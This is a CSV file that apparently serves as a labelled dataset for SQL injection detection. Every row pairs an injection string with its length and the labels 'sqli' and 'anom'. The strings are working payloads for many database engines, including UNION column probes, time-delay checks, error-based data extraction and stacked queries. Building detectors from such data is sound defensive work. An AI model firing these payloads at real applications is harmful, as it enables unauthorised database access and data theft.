"1%')) union all select null,null,null,null,null,null,null,null,null,null--",74,sqli,anom
"1' in boolean mode) and elt(3114=3114,sleep(5))#",48,sqli,anom
1'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,69,sqli,anom
"-1504"") as wpes where 6256=6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",99,sqli,anom
"1) as agex where 8167=8167 and 3824=benchmark(5000000,md5(0x76555642))--",72,sqli,anom
"1'+(select dnxi where 5850=5850 or 8156=(select count(*) from generate_series(1,5000000))--",91,sqli,anom
1'+(select mavu where 4276=4276 rlike sleep(5)#,47,sqli,anom
"1%""))) and make_set(8191=7813,7813) and (((""%""=""",48,sqli,anom
"-8025"") or (1436=4186)*4186 and (""sqwv"" like ""sqwv",50,sqli,anom
"-7887') union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",75,sqli,anom
1'))) and 4069=8786 and ((('eftr'='eftr,39,sqli,anom
"1"";begin dbms_lock.sleep(5); end and ""xouo"" like ""xouo",54,sqli,anom
"1) as fgqe where 1526=1526 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",184,sqli,anom
"1%"";if(8995=9787) select 8995 else drop function ofgg--",55,sqli,anom
"-1174"" union all select 4303,4303,4303,4303#",44,sqli,anom
"-5424')) union all select 8231,8231,8231,8231,8231,8231,8231,8231#",66,sqli,anom
"1 where 5081=5081 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",123,sqli,anom
"1%"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",121,sqli,anom
1 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')# twev,101,sqli,anom
"1%'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('%'='",122,sqli,anom
"1%"";begin dbms_lock.sleep(5); end and ""%""=""",43,sqli,anom
"1%"") union all select null,null--",33,sqli,anom
"1' in boolean mode) and elt(9630=4765,4765)#",44,sqli,anom
"1"") as cysq where 5258=5258;select case when 1574=5523 then 1 else null end--",77,sqli,anom
"1'||(select 'hbho' from dual where 7193=7193;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",147,sqli,anom
"1""))) and elt(2421=9612,9612) and (((""gbdx"" like ""gbdx",54,sqli,anom
"-8325)) as ajxq where 6630=6630 union all select 6630,6630,6630,6630,6630,6630--",80,sqli,anom
"1)) as debc where 7428=7428 union all select null,null,null#",60,sqli,anom
"1'+(select 'plcm' where 2141=2141 and elt(3114=3114,sleep(5))#",62,sqli,anom
"1)) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",79,sqli,anom
1' or 6793=(select 6793 from pg_sleep(5)) and 'dogx'='dogx,58,sqli,anom
"1"" or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",97,sqli,anom
"1%"");iif(5257=5257,1,1/0)",25,sqli,anom
"1 and elt(4249=4249,7259)# lwyo",31,sqli,anom
1) where 7680=7680 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,223,sqli,anom
"1%"") or (select * from (select(sleep(5)))sddo)#",47,sqli,anom
"1' and elt(3114=3114,sleep(5))#",31,sqli,anom
"-9227) where 6723=6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",91,sqli,anom
1 and 9198=9198--,17,sqli,anom
"1"") where 6897=6897;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",116,sqli,anom
"-6334') union all select 3738,3738,3738,3738,3738,3738,3738,3738--",66,sqli,anom
1%'));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,103,sqli,anom
"1' in boolean mode) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))#",123,sqli,anom
-2992')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('tjgt'='tjgt,213,sqli,anom
"-3853"") where 4626=4626 union all select 4626,4626,4626--",57,sqli,anom
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",105,sqli,anom
-5089')) as icbb where 1129=1129 or 6250=9650,45,sqli,anom
"1'+(select inyd where 1668=1668 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))+'",123,sqli,anom
1'));select (case when (5418=6516) then 1 else 5418*(select 5418 from master..sysdatabases) end)--,98,sqli,anom
"-5744) union all select 3617,3617,3617,3617,3617,3617--",55,sqli,anom
"1') where 5883=5883 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",171,sqli,anom
"1' in boolean mode) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",128,sqli,anom
1')) as joco where 2922=2922;select sleep(5)--,46,sqli,anom
"1"")) as irrz where 8730=8730 order by 1#",40,sqli,anom
-2452'))) union all select 1951--,33,sqli,anom
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('tkcy' like 'tkcy",129,sqli,anom
"1%')) union all select null,null,null,null,null--",49,sqli,anom
"1) where 2940=2940;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",109,sqli,anom
1') as xiqw where 8507=8507 rlike sleep(5)--,44,sqli,anom
1'||(select 'vwmg' where 7928=7928;select (case when (8233=1074) then 8233 else 1/(select 0) end)--,99,sqli,anom
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('wfws'='wfws",192,sqli,anom
1')));begin dbms_lock.sleep(5); end--,37,sqli,anom
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",55,sqli,anom
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",142,sqli,anom
1'))) and sleep(5) and ((('hwjy'='hwjy,38,sqli,anom
"-8894%"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""%""=""",219,sqli,anom
"1"")) as fjtv where 8904=8904;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",116,sqli,anom
"1');select count(*) from generate_series(1,5000000)",51,sqli,anom
"1"") as qwyt where 4236=4236 union all select null,null,null,null,null--",71,sqli,anom
"1' and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",155,sqli,anom
1)));waitfor delay '0:0:5' and (((8981=8981,43,sqli,anom
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('edcm' like 'edcm",176,sqli,anom
1'||(select 'zzkx' where 3270=3270 and 2006=2006,48,sqli,anom
"1"")) as drss where 2077=2077 and 7533=7533--",44,sqli,anom
"1%"")) and elt(7633=4110,4110) and ((""%""=""",41,sqli,anom
"-4849"")) or (5005=9111)*9111 and ((""catv"" like ""catv",52,sqli,anom
"1%'))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",147,sqli,anom
"1"")) as esho where 8864=8864 order by 1--",41,sqli,anom
"1"") where 4172=4172 or (select * from (select(sleep(5)))sddo)#",62,sqli,anom
-5134))) or 8571=8571--,23,sqli,anom
"-9808' in boolean mode) union all select 2528,2528,2528,2528,2528,2528,2528--",77,sqli,anom
"1'||(select 'zvpl' where 5877=5877 union all select null,null#",62,sqli,anom
(8362=9139)*9139,16,sqli,anom
"1"")));if(7899=7899) select 7899 else drop function zbbp--",57,sqli,anom
"-8353'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('ptlz'='ptlz",224,sqli,anom
"-4427')) union all select 6357,6357,6357,6357,6357#",51,sqli,anom
"-7737'||(select 'xalo' where 9219=9219 union all select 9219,9219,9219,9219#",76,sqli,anom
"1'))) and make_set(8403=8403,8899) and ((('zxon' like 'zxon",59,sqli,anom
"1%"") and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",100,sqli,anom
"1 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",109,sqli,anom
"1) as ghew where 6441=6441 union all select null,null--",55,sqli,anom
1%')) and 7160=7249--,21,sqli,anom
"-3316%"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",203,sqli,anom
"1%') and elt(1210=1210,sleep(5)) and ('%'='",43,sqli,anom
"-6442""))) or 3038=3038",22,sqli,anom
"1"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""jyad""=""jyad",116,sqli,anom
"1) or elt(6272=6272,sleep(5))",29,sqli,anom
1');(select * from (select(sleep(5)))acdk)#,43,sqli,anom
"1'||(select 'kgjk' where 3530=3530 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",130,sqli,anom
"1%'))) and 2388=benchmark(5000000,md5(0x6d457153))#",51,sqli,anom
1))) and 7533=7533 and (((7740=7740,35,sqli,anom
1' or (select * from (select(sleep(5)))ydpu),44,sqli,anom
-8878' in boolean mode) union all select 7785#,46,sqli,anom
"1'||(select 'skds' from dual where 8594=8594 and make_set(6779=2027,2027))||'",77,sqli,anom
"1') where 1625=1625 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",122,sqli,anom
1' rlike (select * from (select(sleep(5)))vwyq)#,48,sqli,anom
"-7416"" where 7656=7656 order by 1--",35,sqli,anom
"1%' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",111,sqli,anom
1%');select (case when (5740=7636) then 5740 else cast(1 as int)/(select 0 from dual) end) from dual--,102,sqli,anom
"-7423 or make_set(9354=9354,7185)-- hprc",40,sqli,anom
"1"")) waitfor delay '0:0:5'--",28,sqli,anom
"1%') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",66,sqli,anom
"1%"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",95,sqli,anom
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",76,sqli,anom
"-2365)) union all select 8190,8190#",35,sqli,anom
"1"") and elt(6651=1172,1172) and (""zfkb"" like ""zfkb",50,sqli,anom
"1',(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))",84,sqli,anom
1')) and 2006=2006,18,sqli,anom
"1')) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,sqli,anom
"1))) union all select null,null,null,null,null,null,null,null--",63,sqli,anom
1' in boolean mode) and (select * from (select(sleep(5)))fzno)#,63,sqli,anom
-7636') or 5898=8880 and ('sjuv'='sjuv,38,sqli,anom
"1%""))) or sleep(5)#",19,sqli,anom
1 where 8095=8095;select (case when (5152=7853) then 5152 else 5152*(select 5152 from mysql.db) end)#,101,sqli,anom
1%' rlike sleep(5) and '%'=',28,sqli,anom
"-5243"" where 2105=2105 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",255,sqli,anom
"1"") where 6964=6964;select count(*) from generate_series(1,5000000)--",69,sqli,anom
"1"")));begin user_lock.sleep(5); end--",37,sqli,anom
1') and sleep(5) and ('orxt'='orxt,34,sqli,anom
1'));select pg_sleep(5) and (('vxxg'='vxxg,42,sqli,anom
1)) as tnhy where 1874=1874 and 2858=7324#,42,sqli,anom
"1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('rqbf'='rqbf",129,sqli,anom
"-5891) where 5792=5792 union all select 5792,5792,5792,5792,5792#",65,sqli,anom
"1"") where 7513=7513 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",223,sqli,anom
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('pbtf'='pbtf",225,sqli,anom
"1') as ekjw where 5477=5477 union all select null,null,null,null,null--",71,sqli,anom
"1';select like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'bzxo' like 'bzxo",83,sqli,anom
"1%"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""",152,sqli,anom
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('tvar'='tvar",164,sqli,anom
"1)) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((4048=4048",125,sqli,anom
"1'+(select 'ljtl' where 1766=1766;select count(*) from generate_series(1,5000000))+'",84,sqli,anom
"1') where 3572=3572;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",116,sqli,anom
"1%"") and elt(3114=3114,sleep(5))#",33,sqli,anom
1 and 5934=7745,15,sqli,anom
"-8106%"") union all select 2051,2051,2051,2051,2051,2051#",56,sqli,anom
1' in boolean mode) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')#,114,sqli,anom
-1641')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('vgcb' like 'vgcb,263,sqli,anom
"-8021"") union all select 1166,1166,1166,1166--",46,sqli,anom
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""cecf""=""cecf",127,sqli,anom
"1"")) as casz where 5921=5921 rlike (select * from (select(sleep(5)))vwyq)#",74,sqli,anom
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('uzmy' like 'uzmy,75,sqli,anom
"1"")) and 8635=(select count(*) from generate_series(1,5000000))--",65,sqli,anom
"1"" where 3678=3678 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",95,sqli,anom
"1,row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",199,sqli,anom
"1""))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",104,sqli,anom
1' in boolean mode) and 8594=(select 8594 from pg_sleep(5))--,61,sqli,anom
"1))) union all select null,null,null,null,null,null,null,null,null,null--",73,sqli,anom
1)) as gocb where 4335=4335;select case when 8227=1229 then 1 else null end--,77,sqli,anom
1') where 7478=7478;select pg_sleep(5)--,40,sqli,anom
"-3513%"" union all select 8473,8473#",35,sqli,anom
"1)) union all select null,null,null,null,null,null,null#",56,sqli,anom
1'||(select 'hafu' where 6226=6226;(select * from (select(sleep(5)))srmq))||',77,sqli,anom
"-5825) as mflf where 3999=3999 or make_set(1492=7153,7153)--",60,sqli,anom
(8266=8266)*9900,16,sqli,anom
1'))) and 5934=2309,19,sqli,anom
"-3930%"")) order by 1#",21,sqli,anom
1'+(select plhk where 6540=6540;select (case when (8403=7151) then 8403 else cast(1 as int)/(select 0 from dual) end) from dual--,129,sqli,anom
"-1559 union all select 3985,3985,3985,3985#",43,sqli,anom
1'+(select ntym where 4750=4750;select case when 7717=7717 then 1 else null end--,81,sqli,anom
"1') where 6720=6720 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
1%') and sleep(5) and ('%'=',28,sqli,anom
1';waitfor delay '0:0:5' and 'dfzn'='dfzn,41,sqli,anom
1' where 1844=1844;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,127,sqli,anom
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('onmp'='onmp",178,sqli,anom
"1) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",109,sqli,anom
"1) union all select null,null#",30,sqli,anom
1 where 8921=8921 rlike (select * from (select(sleep(5)))sgvo)--,64,sqli,anom
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'nazb'='nazb",174,sqli,anom
"1 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# kfza",112,sqli,anom
"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('luoj'='luoj",125,sqli,anom
1);select pg_sleep(5) and (1044=1044,36,sqli,anom
"1%"")) union all select null,null,null,null#",43,sqli,anom
"-5819%"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""%""=""",252,sqli,anom
"1) where 6150=6150;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",79,sqli,anom
"1"") as kndn where 9314=9314;iif(6307=2459,1,1/0)",48,sqli,anom
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",96,sqli,anom
"-7963'+(select 'kxzh' where 7039=7039 union all select 7039,7039,7039,7039,7039,7039--",86,sqli,anom
"1"") where 9359=9359 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
"1' in boolean mode) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))#",80,sqli,anom
"(select count(*) from generate_series(1,5000000))",49,sqli,anom
"1"") where 4426=4426 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",202,sqli,anom
"1%"")) and 4595=4595#",20,sqli,anom
"1)) as gdcg where 2329=2329 and 8407=(select count(*) from generate_series(1,5000000))--",88,sqli,anom
"1,exp(~(select * from (select concat(0x7171706a71,(select (elt(7759=7759,1))),0x717a767a71,0x78))x))",100,sqli,anom
-5803) where 8651=8651 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,222,sqli,anom
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'obax' like 'obax",82,sqli,anom
"1)) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,sqli,anom
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'zjxk'='zjxk",170,sqli,anom
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('eugs'='eugs",116,sqli,anom
-4906'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('pkrq'='pkrq,227,sqli,anom
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",173,sqli,anom
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('qfls'='qfls",116,sqli,anom
"-2067"" or 3038=3038",19,sqli,anom
"-4945 or make_set(9354=9354,7185)",33,sqli,anom
